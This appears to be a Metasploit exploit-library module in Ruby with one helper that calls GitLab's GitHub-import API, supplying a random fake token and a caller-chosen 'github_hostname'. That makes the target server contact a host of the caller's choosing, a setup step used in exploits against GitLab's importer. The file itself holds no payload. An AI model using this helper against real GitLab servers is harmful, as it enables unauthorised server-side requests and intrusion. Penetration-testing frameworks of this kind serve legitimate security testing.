# -*- coding: binary -*-

module Msf::Exploit::Remote::HTTP::Gitlab::Rest::V4::Import
  # Import a repository from a remote URL
  #
  # @return [String,nil] Import ID if successfully enqueued, nil otherwise
  def gitlab_import_github_repo(group_name:, github_hostname:, api_token:)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/api/v4/import/github'),
      'ctype' => 'application/json',
      'headers' => {
        'PRIVATE-TOKEN' => api_token
      },
      'data' => {
        'personal_access_token' => Rex::Text.rand_text_alphanumeric(8),
        'repo_id' => rand(1000),
        'target_namespace' => group_name,
        'new_name' => "gh-import-#{rand(1000)}",
        'github_hostname' => github_hostname
      }.to_json
    })

    raise Msf::Exploit::Remote::HTTP::Gitlab::Error::ClientError.new message: 'Request timed out' unless res

    # 422 is returned if the import failed, but the response body contains the error message
    if res.code == 422
      raise Msf::Exploit::Remote::HTTP::Gitlab::Error::ImportError, ((res.get_json_document || {})['errors'] || 'Import failed')
    end

    # 201 is returned if the import was successfully enqueued
    unless res.code == 201
      raise Msf::Exploit::Remote::HTTP::Gitlab::Error::ImportError, ((res.get_json_document || {})['errors'] || 'Import failed')
    end

    # Example of a successful response body
    # {"id":54,"name":"gh-import-761","full_path":"/fpXxUqzfQY/gh-import-761","full_name":"fpXxUqzfQY / gh-import-761"}

    body = res.get_json_document

    return body if body

    nil
  end
end
